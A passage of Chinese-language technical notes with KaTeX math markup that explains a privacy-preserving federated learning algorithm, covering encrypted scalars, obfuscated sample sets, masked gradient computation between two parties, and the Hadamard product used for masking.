stretchy="false">(</mo><msub><mi>I</mi><mn>1</mn></msub><mo>∩</mo><msub><mi>I</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I_1^o/(I_1 \cap I_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 的样本，这里的处理核心在于第5步：由于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn mathvariant="script">2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P_2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 知道哪些样本仅在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mn>1</mn></msub><mo>∩</mo><msub><mi>I</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">I_1\cap I_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 中，哪些样本是添加的混淆样本，因此他可以直接把来自<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>I</mi><mn>1</mn><mi>o</mi></msubsup><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><msub><mi>I</mi><mn>1</mn></msub><mo>∩</mo><msub><mi>I</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I_1^o/(I_1 \cap I_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 的样本对应的损失设置为0进行处理。</p></blockquote><p>算法2的核心在于第5、6步中让弱方<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 共享加密的<code>标量（scalars）</code><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">⟨</mo><msub><mi>ϕ</mi><mrow><mi>i</mi><mi>k</mi></mrow></msub><mo fence="true">⟩</mo></mrow><annotation encoding="application/x-tex">\left\langle\phi_{i k}\right\rangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">⟨</span><span class="mord"><span class="mord mathnormal">ϕ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">ik</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">⟩</span></span></span></span></span>，以便让<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 计算出加密的本地梯度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">⟨</mo><msup><mi mathvariant="normal">∇</mi><mi>s</mi></msup><mi mathvariant="script">L</mi><mrow><mo fence="true">(</mo><msub><mi mathvariant="bold">w</mi><mi>k</mi></msub><mo fence="true">)</mo></mrow><mo fence="true">⟩</mo></mrow><annotation encoding="application/x-tex">\left\langle\nabla^{s} \mathcal{L}\left(\mathbf{w}_{k}\right)\right\rangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">⟨</span><span class="mord"><span class="mord">∇</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span></span><span class="mord mathcal">L</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathbf" style="margin-right:0.01597em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.016em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mclose delimcenter" style="top:0em;">⟩</span></span></span></span></span>，标量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">⟨</mo><msub><mi>ϕ</mi><mrow><mi>i</mi><mi>k</mi></mrow></msub><mo fence="true">⟩</mo></mrow><annotation encoding="application/x-tex">\left\langle\phi_{i k}\right\rangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">⟨</span><span class="mord"><span class="mord mathnormal">ϕ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">ik</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">⟩</span></span></span></span></span> 的提出直接体现了<code>GWD</code>的思想。</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 会在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="script">I</mi><mi>k</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi></mrow></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{I}_k^{obf}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2683em;vertical-align:-0.3013em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.967em;"><span style="top:-2.3987em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3013em;"><span></span></span></span></span></span></span></span></span></span> 对应的样本上计算梯度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">⟨</mo><mrow><mo fence="true">∣</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo>∩</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mo fence="true">∣</mo></mrow><mo>⋅</mo><msup><mi mathvariant="normal">∇</mi><mi>s</mi></msup><mi mathvariant="script">L</mi><mrow><mo fence="true">(</mo><msub><mi mathvariant="bold">w</mi><mi>k</mi></msub><mo fence="true">)</mo></mrow><mo fence="true">⟩</mo></mrow><mo>=</mo><msub><mo>∑</mo><mrow><msub><mi>e</mi><mi>i</mi></msub><mo>∈</mo><msup><mi mathvariant="script">I</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi></mrow></msup></mrow></msub><mrow><mo fence="true">⟨</mo><msub><mi>ϕ</mi><mrow><mi>i</mi><mi>k</mi></mrow></msub><mo fence="true">⟩</mo></mrow><msubsup><mi mathvariant="bold">x</mi><mi>i</mi><mi>s</mi></msubsup></mrow><annotation encoding="application/x-tex">\left\langle\left|\mathcal{I}_{1}^{o} \cap \mathcal{I}_{2}^{o}\right| \cdot \nabla^{s} \mathcal{L}\left(\mathbf{w}_{k}\right)\right\rangle=\sum_{e_{i} \in \mathcal{I}^{o b f}}\left\langle\phi_{i k}\right\rangle \mathbf{x}_{i}^{s}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">⟨</span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord">∇</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span></span><span class="mord mathcal">L</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathbf" style="margin-right:0.01597em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.016em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mclose delimcenter" style="top:0em;">⟩</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1498em;vertical-align:-0.3998em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2477em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.782em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3998em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">⟨</span><span class="mord"><span class="mord mathnormal">ϕ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">ik</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">⟩</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span></span></span></span></span></span></span></span></span></span>，注意对应明文的系数为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo>∩</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|\mathcal{I}_1^o\cap\mathcal{I}_2^o|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mord">∣</span></span></span></span>，虽然 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 不知道系数（即其连交集结果的基数cardinality都不知道），但是这个除系数的操作是通过将密文发送给 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ，让其在掩码下完成除系数操作。</p><p>这里是通过<code>哈达玛乘积（Hadamard Product）</code>添加掩码的，Hadamard Product是一种对两同型矩阵进行的运算：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mi>A</mi><mo>∘</mo><mi>B</mi><msub><mo stretchy="false">)</mo><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo>=</mo><mo stretchy="false">(</mo><mi>A</mi><msub><mo stretchy="false">)</mo><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo stretchy="false">(</mo><mi>B</mi><msub><mo stretchy="false">)</mo><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">(A \circ B)_{i j}=(A)_{i j}(B)_{i j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∘</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" 